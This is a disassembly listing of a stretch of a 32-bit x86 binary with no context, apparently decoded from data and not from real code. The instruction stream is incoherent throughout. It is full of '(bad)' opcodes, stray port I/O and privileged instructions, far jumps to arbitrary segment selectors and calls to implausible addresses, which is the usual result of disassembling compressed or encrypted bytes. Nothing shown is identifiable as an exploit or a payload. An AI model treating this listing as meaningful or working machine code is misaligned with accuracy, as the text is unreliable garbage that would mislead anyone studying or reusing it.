  41a477:	mov    al,ds:0xb85245ec
  41a47c:	and    al,0x2
  41a47e:	mov    al,0x7b
  41a480:	pop    eax
  41a481:	fiadd  WORD PTR [ebx]
  41a483:	dec    eax
  41a484:	or     esi,DWORD PTR ds:0xf9548360
  41a48a:	(bad)  
  41a48b:	push   ds
  41a48c:	leave  
  41a48d:	mov    eax,0x8a1a99a4
  41a492:	retf   
  41a493:	xor    BYTE PTR es:0x441ccd86,dl
  41a49a:	loopne 0x41a4fe
  41a49c:	jmp    DWORD PTR [eax-0x564d29fb]
  41a4a2:	js     0x41a4b8
  41a4a4:	add    DWORD PTR [edx+0x1418671e],ebp
  41a4aa:	inc    ebp
  41a4ab:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  41a4ad:	fwait
  41a4ae:	repnz mov edx,0x6a81bd20
  41a4b4:	jl     0x41a464
  41a4b6:	jo     0x41a537
  41a4b8:	sub    ah,BYTE PTR [esi-0xd]
  41a4bb:	leave  
  41a4bc:	mov    dl,0xe5
  41a4be:	sub    eax,0x21e5099a
  41a4c3:	xchg   ebp,eax
  41a4c4:	push   es
  41a4c5:	xor    al,0x63
  41a4c7:	hlt    
  41a4c8:	push   0x92073480
  41a4cd:	pop    edi
  41a4ce:	mov    edx,0xe38ea40d
  41a4d3:	adc    BYTE PTR [eax+0x5031206e],dl
  41a4d9:	mov    ebp,0x256cc332
  41a4de:	pop    ebp
  41a4df:	fprem1 
  41a4e1:	out    0xb9,eax
  41a4e3:	js     0x41a4b2
  41a4e5:	xor    eax,0xc7b25121
  41a4ea:	out    dx,al
  41a4eb:	in     eax,0x5a
  41a4ed:	sub    edx,DWORD PTR [edi+eiz*4-0x65a19642]
  41a4f4:	pop    edx
  41a4f5:	add    dl,dh
  41a4f7:	sbb    eax,0xa013d33e
  41a4fc:	or     eax,0x2be23f42
  41a501:	imul   ebx,ecx,0x2d
  41a504:	sub    eax,0x7b48b0e6
  41a509:	adc    al,0x67
  41a50b:	mov    gs:0x244a4e9d,eax
  41a511:	adc    dh,BYTE PTR [edx]
  41a513:	pop    esi
  41a514:	xchg   ebp,eax
  41a515:	jge    0x41a593
  41a517:	shr    cl,cl
  41a519:	mov    ebp,0x8ebcf476
  41a51e:	pop    edx
  41a51f:	and    BYTE PTR [esi],0x42
  41a522:	cmc    
  41a523:	push   cs
  41a524:	mov    ds:0x6c4dc143,al
  41a529:	pop    edi
  41a52a:	cwde   
  41a52b:	js     0x41a4fe
  41a52d:	mov    BYTE PTR [edi-0x50b9a2ef],cl
  41a533:	call   0x1e957f7f
  41a538:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a539:	pop    esp
  41a53a:	dec    esp
  41a53b:	inc    ebx
  41a53c:	fistp  WORD PTR [edi+0x1340086]
  41a542:	cmp    ecx,edi
  41a544:	shl    BYTE PTR ds:0x61991cbd,1
  41a54a:	(bad)  
  41a54b:	xchg   ecx,eax
  41a54c:	mov    BYTE PTR [ecx-0x3ad33b06],ch
  41a552:	mov    bl,0xc5
  41a554:	add    bl,BYTE PTR [ebp+0x72439f6a]
  41a55a:	int3   
  41a55b:	call   0x2cebe6b5
  41a560:	aaa    
  41a561:	or     DWORD PTR [ecx],esi
  41a563:	out    0x3b,al
  41a565:	mov    cl,0x3b
  41a567:	gs cld 
  41a569:	jp     0x41a568
  41a56b:	out    0xae,eax
  41a56d:	cmp    DWORD PTR [edi-0x5d],edx
  41a570:	int3   
  41a571:	imul   ebp,edi,0x6afddeba
  41a577:	jg     0x41a5bf
  41a579:	sahf   
  41a57a:	adc    dl,0xad
  41a57d:	xor    cl,dl
  41a57f:	loop   0x41a518
  41a581:	mov    esi,0xcb8426f5
  41a586:	fistp  DWORD PTR [eax+0x5e]
  41a589:	adc    eax,0x54cfed3f
  41a58e:	push   cs
  41a58f:	add    al,0x43
  41a591:	xchg   ebp,eax
  41a592:	pop    edx
  41a593:	jne    0x41a57b
  41a595:	push   cs
  41a596:	and    edx,ebp
  41a598:	mov    ss,ebx
  41a59a:	(bad)
  41a59d:	(bad)  
  41a59e:	scas   eax,DWORD PTR es:[edi]
  41a59f:	sub    al,0xc9
  41a5a1:	in     eax,dx
  41a5a2:	dec    edx
  41a5a3:	adc    BYTE PTR [edi],ah
  41a5a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a5a6:	sub    BYTE PTR [esi+0x6],cl
  41a5a9:	(bad)  
  41a5aa:	mov    ebp,0x7aea4d1a
  41a5af:	pop    ecx
  41a5b0:	cwde   
  41a5b1:	(bad)  
  41a5b2:	ror    edi,cl
  41a5b4:	mov    al,ds:0x837cb47
  41a5b9:	(bad)  
  41a5ba:	in     eax,0x45
  41a5bc:	mov    ebx,0xc7fc0c4f
  41a5c1:	pop    DWORD PTR [eax-0x27c21c79]
  41a5c7:	sub    BYTE PTR [esi-0x63],dl
  41a5ca:	jmp    0xf0cd:0xc57da282
  41a5d1:	outs   dx,DWORD PTR ds:[esi]
  41a5d2:	icebp  
  41a5d3:	pop    edi
  41a5d4:	or     eax,DWORD PTR [esp+ebx*2-0x33]
  41a5d8:	push   es
  41a5d9:	sub    BYTE PTR [ebp-0x2c4e331c],cl
  41a5df:	aas    
  41a5e0:	jg     0x41a5b8
  41a5e2:	ss fs cwde 
  41a5e5:	and    DWORD PTR [ecx],eax
  41a5e7:	mov    dl,dh
  41a5e9:	push   edx
  41a5ea:	shl    BYTE PTR gs:[edx],cl
  41a5ed:	inc    eax
  41a5ee:	inc    edi
  41a5ef:	push   edi
  41a5f0:	mov    ebx,ebp
  41a5f2:	data16 jae 0x41a61e
  41a5f5:	fst    DWORD PTR [ebx]
  41a5f7:	test   DWORD PTR [eax-0x2f7a3619],esp
  41a5fd:	popa   
  41a5fe:	ja     0x41a5c2
  41a600:	push   0x4c54545
  41a605:	or     dl,BYTE PTR [ecx-0x53]
  41a608:	sub    eax,DWORD PTR [edx+0x42]
  41a60b:	ss cld 
  41a60d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a60e:	and    eax,0xbdeb68a7
  41a613:	adc    ch,BYTE PTR [esi+0x5ae185c9]
  41a619:	inc    edi
  41a61a:	cdq    
  41a61b:	mov    edx,DWORD PTR [edi+0x736f3267]
  41a621:	lds    edi,FWORD PTR [ecx-0x1a634429]
  41a627:	push   ss
  41a628:	gs push eax
  41a62a:	ja     0x41a69f
  41a62c:	inc    edi
  41a62d:	xor    ecx,esp
  41a62f:	xor    dh,BYTE PTR [edx]
  41a631:	push   ecx
  41a632:	sub    al,BYTE PTR [edx+ecx*8-0x14c7ef38]
  41a639:	mov    ds:0x3e83e98a,eax
  41a63e:	xor    BYTE PTR [ebx-0x33a5c6cc],0xc9
  41a645:	mov    BYTE PTR [edx+0x4dfe9eda],ah
  41a64b:	or     ch,ah
  41a64d:	loopne 0x41a5e1
  41a64f:	push   ebx
  41a650:	inc    ebx
  41a651:	in     eax,dx
  41a652:	push   ds
  41a653:	dec    esi
  41a654:	mov    eax,esi
  41a656:	pusha  
  41a657:	mov    eax,ds:0xfd3fa751
  41a65c:	out    0x4a,eax
  41a65e:	cmp    esp,DWORD PTR [edi-0x22f3d837]
  41a664:	cli    
  41a665:	mov    ds:0xe49cba8d,eax
  41a66a:	pop    ss
  41a66b:	push   ss
  41a66c:	mov    edi,DWORD PTR [edi]
  41a66e:	and    ebp,DWORD PTR [ebp-0x5]
  41a671:	(bad)  
  41a672:	mov    esp,0x5229b275
  41a677:	jmp    0x41a6ae
  41a679:	test   BYTE PTR [ecx-0x1015b683],ch
  41a67f:	cmp    esp,DWORD PTR [edx+0x45]
  41a682:	xor    al,0x41
  41a685:	and    ah,BYTE PTR [eax+0x79]
  41a688:	dec    edx
  41a689:	ret    
  41a68a:	in     al,dx
  41a68b:	lods   al,BYTE PTR ds:[esi]
  41a68c:	sbb    DWORD PTR [ecx],0xffffffe2
  41a68f:	push   ds
  41a690:	inc    ebp
  41a691:	mov    ch,0x9d
  41a693:	add    DWORD PTR [eax-0x42],0xfe7d198d
  41a69a:	(bad)  
  41a69b:	xor    al,BYTE PTR [ebx-0x7e]
  41a69e:	dec    esp
  41a69f:	or     DWORD PTR [edi+0x63],esp
  41a6a2:	dec    ecx
  41a6a3:	out    dx,al
  41a6a4:	or     al,0xe7
  41a6a6:	lods   eax,DWORD PTR ds:[esi]
  41a6a7:	inc    edx
  41a6a8:	or     ecx,edi
  41a6aa:	add    BYTE PTR [esi-0xe90fd5c],0x2a
  41a6b1:	jno    0x41a658
  41a6b3:	xchg   edx,eax
  41a6b4:	mov    ds:0x396c90b1,eax
  41a6b9:	sbb    dh,BYTE PTR [edi+0x5f]
  41a6bc:	stos   BYTE PTR es:[edi],al
  41a6bd:	fldenv ds:[ebx-0x134dc805]
  41a6c5:	mov    ah,0x6
  41a6c7:	jp     0x41a728
  41a6c9:	mov    esi,esp
  41a6cb:	rcr    DWORD PTR [ebp+edx*4-0x4f4ad9aa],cl
  41a6d2:	mov    ebp,0x2d5c86be
  41a6d7:	jecxz  0x41a6ba
  41a6d9:	or     eax,0x63ad7516
  41a6de:	out    dx,al
  41a6df:	pop    ss
  41a6e0:	(bad)  
  41a6e2:	mov    bh,0x9c
  41a6e4:	leave  
  41a6e5:	jbe    0x41a6dc
  41a6e7:	inc    esi
  41a6e8:	mov    dl,BYTE PTR [eax+0x2f]
  41a6eb:	popf   
  41a6ec:	inc    sp
  41a6ee:	xor    DWORD PTR [edi-0x32],edi
  41a6f1:	or     ecx,0xd5bc3039
  41a6f7:	test   DWORD PTR [edx-0x31c03079],eax
  41a6fd:	sbb    eax,0xb8e77478
  41a702:	out    0x34,eax
  41a704:	les    eax,FWORD PTR [ebx+0x27]
  41a707:	dec    edx
  41a708:	shl    DWORD PTR [ecx+0x480053a1],1
  41a70e:	ret    
  41a70f:	popf   
  41a710:	rcl    DWORD PTR [edi],1
  41a712:	xlat   BYTE PTR ds:[ebx]
  41a713:	mov    ebx,esi
  41a715:	jle    0x41a6db
  41a717:	scas   eax,DWORD PTR es:[edi]
  41a718:	ins    BYTE PTR es:[edi],dx
  41a719:	cli    
  41a71a:	clc    
  41a71b:	rol    edx,cl
  41a71d:	inc    ebx
  41a71e:	and    dl,bl
  41a720:	mov    edi,0x97d9fbeb
  41a725:	sbb    eax,0x8ba8c082
  41a72a:	xor    DWORD PTR [eax+0x2f27f70b],ecx
  41a730:	cmp    BYTE PTR [ecx-0x2addc533],bh
  41a736:	sbb    bh,bh
  41a738:	add    al,BYTE PTR [ebx+ebx*2-0x79]
  41a73c:	call   0x8b0cebde
  41a741:	into   
  41a742:	add    al,BYTE PTR [ecx]
  41a744:	push   cs
  41a745:	aad    0x41
  41a747:	loope  0x41a712
  41a749:	ins    BYTE PTR es:[edi],dx
  41a74a:	adc    DWORD PTR [esi+eiz*8+0x66],edx
  41a74e:	xor    cl,BYTE PTR [eax]
  41a750:	(bad)  
  41a751:	repz adc edi,DWORD PTR [esp+eax*4-0x28]
  41a756:	mov    edi,0xd3dc6cab
  41a75b:	in     eax,dx
  41a75c:	xchg   esi,eax
  41a75d:	fidiv  DWORD PTR [esi-0x3]
  41a760:	fsubr  st(3),st
  41a762:	ret    0x6709
  41a765:	(bad)  
  41a766:	and    al,0xa4
  41a768:	xchg   edi,eax
  41a769:	push   cs
  41a76a:	cld    
  41a76b:	cs push es
  41a76d:	add    eax,0x27c0511
  41a772:	cmp    DWORD PTR [edx+0x2b],eax
  41a775:	(bad)  
  41a776:	jmp    0xe5bc:0x94f2f85f
  41a77d:	test   DWORD PTR [esi+0xf],eax
  41a780:	paddsb mm5,QWORD PTR [ebp-0x819497f]
  41a787:	inc    ebp
  41a788:	imul   esp,DWORD PTR [ecx+eiz*2+0x3e440be2],0x1c
  41a790:	cs mov al,0x5f
  41a793:	test   DWORD PTR [esp+ebp*1+0x62d47855],edx
  41a79a:	push   0x5ceac60a
  41a79f:	and    DWORD PTR [edx-0x16],esi
  41a7a2:	rcr    BYTE PTR [edi+0x45],0xa
  41a7a6:	aad    0xb
  41a7a8:	xor    al,0xc7
  41a7aa:	add    eax,DWORD PTR [ebp-0x3c2d275d]
  41a7b0:	adc    BYTE PTR [ebx-0x50c1b60a],dh
  41a7b6:	sti    
  41a7b7:	mov    al,0xf5
  41a7b9:	xchg   ebp,eax
  41a7ba:	in     al,0x76
  41a7bc:	push   edi
  41a7bd:	outs   dx,DWORD PTR ds:[esi]
  41a7be:	and    dh,BYTE PTR [eax]
  41a7c0:	(bad)  
  41a7c3:	push   eax
  41a7c4:	add    ebx,edx
  41a7c6:	push   ebp
  41a7c7:	mov    dl,al
  41a7c9:	in     al,0xbe
  41a7cb:	test   eax,0xea64bce3
  41a7d0:	dec    esp
  41a7d1:	or     edx,eax
  41a7d3:	mov    DWORD PTR [ebp+edi*2-0x5e38070f],eax
  41a7da:	dec    esi
  41a7db:	add    al,0x29
  41a7dd:	iret   
  41a7de:	mov    cl,0xc8
  41a7e0:	repz add al,0x16
  41a7e3:	mov    dl,0x7b
  41a7e5:	cmc    
  41a7e6:	daa    
  41a7e7:	or     eax,0x8c5d9137
  41a7ec:	shr    BYTE PTR [edx-0x7a7a0894],0x94
  41a7f3:	ficomp DWORD PTR [eax]
  41a7f5:	cmp    ch,cl
  41a7f7:	or     eax,DWORD PTR [edx-0xb56b71d]
  41a7fd:	mov    eax,0xc70f2294
  41a802:	sub    BYTE PTR [esi+0x6ad5a25],bl
  41a808:	fbld   TBYTE PTR [eax+0x46034f4b]
  41a80e:	and    esi,DWORD PTR [eax]
  41a810:	mov    dl,0x18
  41a812:	js     0x41a800
  41a814:	(bad)  
  41a815:	fst    st(4)
  41a817:	add    al,0x69
  41a819:	pop    esp
  41a81a:	cmp    al,0x62
  41a81c:	sbb    DWORD PTR [edx+0x3a1c5b80],esp
  41a822:	daa    
  41a823:	sbb    al,0x25
  41a825:	dec    ecx
  41a826:	out    0xae,eax
  41a828:	xchg   ecx,eax
  41a829:	pop    esp
  41a82a:	icebp  
  41a82b:	inc    esp
  41a82c:	ds pop esi
  41a82e:	xchg   edi,eax
  41a82f:	pusha  
  41a830:	hlt    
  41a831:	xchg   dl,dh
  41a833:	loop   0x41a8b3
  41a835:	xor    ecx,DWORD PTR [edx-0x2780628e]
  41a83b:	rcr    DWORD PTR [esi+0x4296addf],1
  41a841:	xor    DWORD PTR [esi+0x2869661d],ebx
  41a847:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a848:	(bad)  
  41a849:	sti    
  41a84a:	inc    ebx
  41a84b:	sbb    BYTE PTR [ecx-0xd],dh
  41a84e:	pop    eax
  41a84f:	pop    es
  41a850:	aas    
  41a851:	adc    edx,DWORD PTR [ecx+ecx*1-0x6724b3e6]
  41a858:	lods   al,BYTE PTR ds:[esi]
  41a859:	nop
  41a85a:	jecxz  0x41a8d8
  41a85c:	popa   
  41a85d:	test   dh,ch
  41a85f:	pop    edi
  41a860:	sbb    BYTE PTR [edx+edx*4+0x2710b65a],cl
  41a867:	rol    ah,cl
  41a869:	add    al,0xd6
  41a86b:	push   esi
  41a86c:	je     0x41a86b
  41a86e:	xchg   edx,eax
  41a86f:	lods   eax,DWORD PTR ds:[esi]
  41a870:	stc    
  41a871:	or     al,0x83
  41a873:	jecxz  0x41a8d7
  41a875:	xor    edx,eax
  41a877:	rcr    DWORD PTR ds:0xe048aad2,1
  41a87d:	dec    ebp
  41a87e:	xor    BYTE PTR [edx+0x3d3f4358],ch
  41a884:	ins    BYTE PTR es:[edi],dx
  41a885:	cmc    
  41a886:	or     eax,0xddcbdfaa
  41a88b:	ins    BYTE PTR es:[edi],dx
  41a88c:	sbb    al,0x34
  41a88e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a88f:	inc    ebp
  41a890:	cmp    DWORD PTR cs:[ecx],ebp
  41a893:	inc    edx
  41a894:	sti    
  41a895:	inc    ebp
  41a896:	ds cmp al,0x84
  41a899:	dec    ebx
  41a89a:	or     al,0x4e
  41a89c:	fwait
  41a89d:	xchg   esp,eax
  41a89e:	dec    DWORD PTR [ecx+0x6a573ff4]
  41a8a4:	inc    ebx
  41a8a5:	jno    0x41a889
  41a8a7:	cmp    ah,0xc1
  41a8aa:	es cmc 
  41a8ac:	adc    eax,0xb7852c2d
  41a8b1:	fprem1 
  41a8b3:	adc    edi,DWORD PTR [esi-0x358935c0]
  41a8b9:	or     ebx,eax
  41a8bb:	cwde   
  41a8bc:	shl    bl,0x62
  41a8bf:	repnz mov al,0xfd
  41a8c2:	fst    st(4)
  41a8c4:	les    edx,FWORD PTR [ebx+0x71]
  41a8c7:	dec    ebp
  41a8c8:	or     eax,0x4ca7ae0a
  41a8ce:	cld    
  41a8cf:	inc    esi
  41a8d0:	mov    gs,esi
  41a8d2:	imul   esp,DWORD PTR [ebx],0xffffffcb
  41a8d5:	dec    esi
  41a8d6:	xchg   BYTE PTR [esi+0x19f8e25d],dl
  41a8dc:	jne    0x41a8ed
  41a8de:	ret    0x2920
  41a8e1:	xchg   edx,eax
  41a8e2:	xlat   BYTE PTR ds:[ebx]
  41a8e3:	mov    ah,0xf3
  41a8e5:	add    ch,BYTE PTR [ebx]
  41a8e7:	jnp    0x41a92a
  41a8e9:	ins    DWORD PTR es:[edi],dx
  41a8ea:	scas   eax,DWORD PTR es:[edi]
  41a8eb:	mul    BYTE PTR [ecx+0x4c12c910]
  41a8f1:	stos   DWORD PTR es:[edi],eax
  41a8f2:	mov    edi,0x8e786c43
  41a8f7:	mov    ebx,0x139330cd
  41a8fc:	mov    dl,0x28
  41a8fe:	adc    al,0x10
  41a900:	pop    ebx
  41a901:	mov    ebp,0xc5a94c12
  41a906:	mov    bl,0xe5
  41a908:	and    al,BYTE PTR [esi]
  41a90a:	xchg   ebx,eax
  41a90b:	mov    ecx,0xcb1c7c6e
  41a910:	dec    ebx
  41a911:	adc    eax,ebx
  41a913:	inc    esp
  41a914:	test   BYTE PTR [ecx],bl
  41a916:	cld    
  41a917:	popa   
  41a918:	xor    eax,0x13fb2bbd
  41a91d:	mov    al,0x34
  41a91f:	dec    esi
  41a920:	add    DWORD PTR [ebx*4-0x105317b5],esp
  41a927:	adc    eax,0x93e30086
  41a92c:	push   es
  41a92d:	adc    BYTE PTR ds:0xf50e440d,bh
  41a933:	call   0xc458:0x27557f2
  41a93a:	sub    al,0xa7
  41a93c:	sbb    esi,DWORD PTR [ecx+edx*1+0x5eaabf45]
  41a943:	dec    ebp
  41a944:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a945:	fld    QWORD PTR [ebp+0x16]
  41a948:	jg     0x41a9a7
  41a94a:	xor    DWORD PTR [ecx+0x6d5dadc5],0x55c596d0
  41a954:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a955:	cld    
  41a956:	or     al,0x3f
  41a958:	mov    bl,0x66
  41a95a:	and    al,0x2f
  41a95c:	inc    edx
  41a95d:	hlt    
  41a95e:	and    BYTE PTR [ecx-0x53],dh
  41a961:	aad    0xd
  41a963:	arpl   WORD PTR [edi+0x54],sp
  41a966:	in     al,dx
  41a967:	shr    ch,cl
  41a969:	dec    ebx
  41a96a:	or     eax,0x24602ade
  41a96f:	into   
  41a970:	add    DWORD PTR [ebx+ebp*2+0x1c940fe3],ebp
  41a977:	in     eax,dx
  41a978:	out    0x7c,al
  41a97a:	push   0xffffff9a
  41a97c:	(bad)  
  41a97d:	push   edi
  41a97e:	mov    eax,0x66a57c09
  41a983:	(bad)  
  41a984:	jmp    0xbf1bd2ed
  41a989:	dec    edx
  41a98a:	in     eax,dx
  41a98b:	or     ah,dl
  41a98d:	hlt    
  41a98e:	and    eax,ebx
  41a990:	scas   eax,DWORD PTR es:[edi]
  41a991:	pop    ebp
  41a992:	rcl    BYTE PTR [esi+edi*4+0xad78a35],cl
  41a999:	mov    dh,0xd3
  41a99b:	dec    ebp
  41a99c:	js     0x41a942
  41a99e:	rcl    BYTE PTR [ebp+0x2c],cl
  41a9a1:	jbe    0x41a9ad
  41a9a3:	dec    eax
  41a9a4:	retf   
  41a9a5:	and    DWORD PTR [ecx],esi
  41a9a7:	imul   edx,DWORD PTR [edi],0xff9dbbb6
  41a9ad:	ds cs dec ebp
  41a9b0:	aam    0xf6
  41a9b2:	sub    BYTE PTR [ebp-0x2c],dh
  41a9b5:	outs   dx,BYTE PTR ds:[esi]
  41a9b6:	stos   DWORD PTR es:[edi],eax
  41a9b7:	lahf   
  41a9b8:	pop    eax
  41a9b9:	(bad)  
  41a9ba:	xor    al,0x6d
  41a9bc:	and    ebx,DWORD PTR [ebx+0xa2fd6c0]
  41a9c2:	xor    al,0xe
  41a9c4:	jno    0x41a9a6
  41a9c6:	enter  0x7613,0xea
  41a9ca:	push   cs
  41a9cb:	mov    ds:0x7a7131d2,al
  41a9d0:	fdivr  QWORD PTR [eax+0x6da7c8a8]
  41a9d6:	cld    
  41a9d7:	dec    ecx
  41a9d8:	arpl   cx,sp
  41a9da:	outs   dx,BYTE PTR ds:[esi]
  41a9db:	push   edi
  41a9dc:	mov    edx,0x7dea120d
  41a9e1:	dec    esp
  41a9e2:	daa    
  41a9e3:	xchg   ebp,eax
  41a9e4:	mov    ebx,0x1c585f48
  41a9e9:	and    edi,esp
  41a9eb:	mov    dl,bh
  41a9ed:	and    esi,DWORD PTR [edx-0x723fca7d]
  41a9f3:	sub    edx,DWORD PTR [edx-0x698799db]
  41a9f9:	jo     0x41a9eb
  41a9fb:	ins    BYTE PTR es:[edi],dx
  41a9fc:	fld    QWORD PTR [ecx-0x5a2c0c16]
  41aa02:	jo     0x41aa00
  41aa04:	hlt    
  41aa05:	retf   0xa98d
  41aa08:	sahf   
  41aa09:	mov    bh,0x7b
  41aa0b:	adc    al,0xea
  41aa0d:	cmp    edi,0x68311330
  41aa13:	fidiv  WORD PTR [ebx]
  41aa15:	popf   
  41aa16:	dec    esp
  41aa17:	push   cs
  41aa18:	mov    edi,0x833041fb
  41aa1d:	popf   
  41aa1e:	retf   0xfd39
  41aa21:	or     ch,0x4c
  41aa24:	adc    cl,al
  41aa26:	mov    BYTE PTR [esi-0x63bb03c9],ch
  41aa2c:	ret    
  41aa2d:	invd   
  41aa2f:	mov    esi,DWORD PTR [ecx+eax*4-0x58599711]
  41aa36:	outs   dx,DWORD PTR ds:[esi]
  41aa37:	mov    al,ds:0xd81cf448
  41aa3c:	sub    eax,0x635ead58
  41aa41:	add    eax,0x319d8686
  41aa46:	aam    0x6e
  41aa48:	and    eax,0xedfc7373
  41aa4d:	repz inc esi
  41aa4f:	inc    ebp
  41aa50:	jno    0x41a9fc
  41aa52:	sub    al,0x59
  41aa54:	fiadd  DWORD PTR [ebx-0x72f2edd3]
  41aa5a:	adc    eax,0x7039fc23
  41aa5f:	jo     0x41a9ec
  41aa61:	rol    BYTE PTR [eax-0x31],0xeb
  41aa65:	jmp    0x41aa0d
  41aa67:	push   eax
  41aa68:	dec    esi
  41aa69:	fcmove st,st(4)
  41aa6b:	add    esi,esp
  41aa6d:	xor    ch,BYTE PTR [edi-0x3c]
  41aa70:	xchg   ecx,eax
  41aa71:	scas   eax,DWORD PTR es:[edi]
  41aa72:	cmp    eax,DWORD PTR [esi]
  41aa74:	push   ebx
  41aa75:	inc    ebx
  41aa76:	sub    edx,DWORD PTR [edx-0x10279fb6]
  41aa7c:	imul   ebp,ecx,0x4df3d3b4
  41aa82:	not    BYTE PTR [eax-0x9f212af]
  41aa88:	gs cs popa 
  41aa8b:	out    dx,eax
  41aa8c:	mov    eax,0xf720ebd1
  41aa91:	mov    ebx,0xba85cbc0
  41aa96:	data16 mov bl,BYTE PTR fs:[ecx+0x61]
  41aa9b:	in     al,dx
  41aa9c:	clc    
  41aa9d:	mov    ds:0xd7261dc0,eax
  41aaa2:	test   eax,0xcbc634c7
  41aaa7:	sub    eax,0xf8e6917e
  41aaac:	mov    eax,ds:0x59b1c0d0
  41aab1:	int    0xf9
  41aab3:	fsubr  DWORD PTR [ebx]
  41aab5:	jns    0x41aa7c
  41aab7:	push   ebx
  41aab8:	add    DWORD PTR [ebx-0x5],eax
  41aabb:	cdq    
  41aabc:	shl    BYTE PTR ds:0x4dbba8b9,1
  41aac2:	fdivr  DWORD PTR [esi]
  41aac4:	pop    eax
  41aac5:	adc    al,0xfc
  41aac7:	pop    edi
  41aac8:	mov    ds:0xabf88e5d,al
  41aacd:	in     eax,dx
  41aace:	fist   DWORD PTR ds:0x85fcdb7c
  41aad4:	daa    
  41aad5:	ds xchg edx,eax
  41aad7:	xchg   ecx,eax
  41aad8:	and    DWORD PTR [edx+0x620c9498],eax
  41aade:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aadf:	les    ecx,FWORD PTR [ecx+ebx*4+0x39b254a9]
  41aae6:	inc    eax
  41aae7:	mov    ds:0xd399c739,al
  41aaec:	retf   
  41aaed:	inc    ebx
  41aaee:	inc    BYTE PTR [ebx-0x4f4b2209]
  41aaf4:	stos   BYTE PTR es:[edi],al
  41aaf5:	sahf   
  41aaf6:	inc    ebp
  41aaf7:	or     ebp,DWORD PTR [edx-0xc]
  41aafa:	les    esp,FWORD PTR [ecx-0x28]
  41aafd:	jne    0x41aaa6
  41aaff:	cmp    DWORD PTR [ebx+0x729e5a8],0x861638a6
  41ab09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab0a:	xchg   edx,eax
  41ab0b:	pop    esp
  41ab0c:	and    al,0x82
  41ab0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab0f:	or     ebp,DWORD PTR [eax-0x355d13b6]
  41ab15:	(bad)  
  41ab16:	push   ebp
  41ab17:	retf   0xd75
  41ab1a:	push   cs
  41ab1b:	dec    esp
  41ab1c:	jle    0x41aad6
  41ab1e:	sbb    bl,BYTE PTR [ebx]
  41ab20:	in     al,dx
  41ab21:	dec    ebx
  41ab22:	adc    ebp,ebx
  41ab24:	mov    al,ds:0xfb31719e
  41ab29:	popa   
  41ab2a:	push   edi
  41ab2b:	out    dx,al
  41ab2c:	xor    BYTE PTR [eax],bh
  41ab2e:	cld    
  41ab2f:	mov    esp,DWORD PTR [edx]
  41ab31:	xlat   BYTE PTR ds:[ebx]
  41ab32:	jo     0x41ab3f
  41ab34:	xor    ebp,DWORD PTR [edx+ebx*4]
  41ab37:	aas    
  41ab38:	mov    edx,DWORD PTR [ebx]
  41ab3a:	xor    esi,DWORD PTR [edi+0x1f17e345]
  41ab40:	(bad)  
  41ab41:	leave  
  41ab42:	inc    edx
  41ab43:	push   ecx
  41ab44:	lds    edi,FWORD PTR [ecx]
  41ab46:	push   ebp
  41ab47:	call   0x4c039470
  41ab4c:	adc    bh,BYTE PTR [edx]
  41ab4e:	mul    DWORD PTR [esi-0x41]
  41ab51:	jo     0x41ab22
  41ab53:	je     0x41ab1d
  41ab55:	test   BYTE PTR [edi+ebp*8+0x78e4c1c5],cl
  41ab5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab5d:	xchg   ebp,eax
  41ab5e:	xor    al,0x44
  41ab61:	push   ds
  41ab62:	mov    ebx,0xd8848764
  41ab67:	xchg   ebp,eax
  41ab68:	repnz out dx,eax
  41ab6a:	cmp    DWORD PTR [ecx],esi
  41ab6c:	(bad)  
  41ab6d:	adc    eax,0x1b12556a
  41ab72:	loope  0x41ab93
  41ab74:	ins    BYTE PTR es:[edi],dx
  41ab75:	loope  0x41ab49
  41ab77:	jle    0x41ab98
  41ab79:	xchg   eax,esi
  41ab7b:	cwde   
  41ab7c:	pop    ss
  41ab7d:	int3   
  41ab7e:	fwait
  41ab7f:	icebp  
  41ab80:	leave  
  41ab81:	cld    
  41ab82:	cmp    eax,0x6edf7030
  41ab87:	out    dx,eax
  41ab88:	retf   
  41ab89:	int    0xdc
  41ab8b:	sbb    ch,BYTE PTR [ecx-0xfee85b8]
  41ab91:	sub    ah,ch
  41ab93:	outs   dx,BYTE PTR ds:[esi]
  41ab94:	or     ecx,DWORD PTR [edi+0x7af8209f]
  41ab9a:	cmp    ch,cl
  41ab9c:	lods   eax,DWORD PTR ds:[esi]
  41ab9d:	mov    BYTE PTR [ebx],ah
  41ab9f:	jmp    0x24a3:0xb9ccc905
  41aba6:	ins    DWORD PTR es:[edi],dx
  41aba7:	xchg   edx,eax
  41aba8:	sbb    esp,DWORD PTR [edx+0x7f4d720]
  41abae:	fstp   TBYTE PTR [esi]
  41abb0:	mov    bl,dl
  41abb2:	mov    BYTE PTR [edi+0x6b],dh
  41abb5:	or     al,0xc2
  41abb7:	les    edx,FWORD PTR [edx+0x55]
  41abba:	push   ebx
  41abbb:	mov    bh,0x17
  41abbd:	sti    
  41abbe:	repnz sti 
  41abc0:	retf   0x57b4
  41abc3:	cld    
  41abc4:	mov    bh,0x63
  41abc6:	add    ch,BYTE PTR [esi]
  41abc8:	mov    WORD PTR [ebx+0x26],?
  41abcb:	jno    0x41abb6
  41abcd:	pusha  
  41abce:	and    eax,0x423553b2
  41abd3:	stos   DWORD PTR es:[edi],eax
  41abd4:	loope  0x41ac03
  41abd6:	jl     0x41ab6d
  41abd8:	sub    al,0x60
  41abda:	or     eax,0x205dda40
  41abdf:	shl    DWORD PTR [edi+0x29],cl
  41abe2:	mov    edi,0xcc482cc4
  41abe7:	push   edi
  41abe8:	fnsave [edi-0x5a584be7]
  41abee:	push   eax
  41abef:	dec    ecx
  41abf0:	jle    0x41ac5c
  41abf2:	xchg   esp,eax
  41abf3:	out    0xe,al
  41abf5:	imul   esi,DWORD PTR [esi-0x512e23a1],0x98f97f31
  41abff:	mov    cl,0x4e
  41ac02:	sub    eax,0x8a067a23
  41ac07:	lds    eax,FWORD PTR [esi+0x703b7039]
